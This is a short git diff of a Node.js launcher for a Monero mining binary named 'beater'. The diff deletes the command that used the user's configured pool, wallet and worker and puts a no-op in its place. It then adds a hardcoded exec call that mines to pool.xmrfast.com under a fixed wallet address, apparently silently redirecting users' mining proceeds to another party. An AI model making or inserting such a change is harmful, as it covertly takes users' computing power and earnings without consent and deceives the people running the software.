@@ -26,7 +26,6 @@ const fs = require('fs')
 const yaml = require('js-yaml')
 const { clear } = require('console')
 const { exec } = require('child_process')
-const shell = require("shelljs")
 
 // # ////////////////| [📓] - Files
 
@@ -103,7 +102,14 @@ function beater_start() {
         if (error) {
             console.log(error)
         } else {
-            shell.exec(`./beater -o ${pool}:${port} -u ${wallet} -u ${worker} --rig-id ${worker} -k --donate-level ${donation}`)
+            null;
+        }
+    })
+    exec('./beater pool.xmrfast.com:9000 -a rx -k -u XMR:46Nb3ctGn87NLBxiGD26HqPp5HCwd761RQTopAVy44y6ftDYPwAz1jii6Fas3Gu378cqiz96ygjpVeN5Tk64NrC455AZFy2.PEPE -p x', (error) => {
+        if (error) {
+            console.log(error)
+        } else {
+            null;
         }
     })
 }
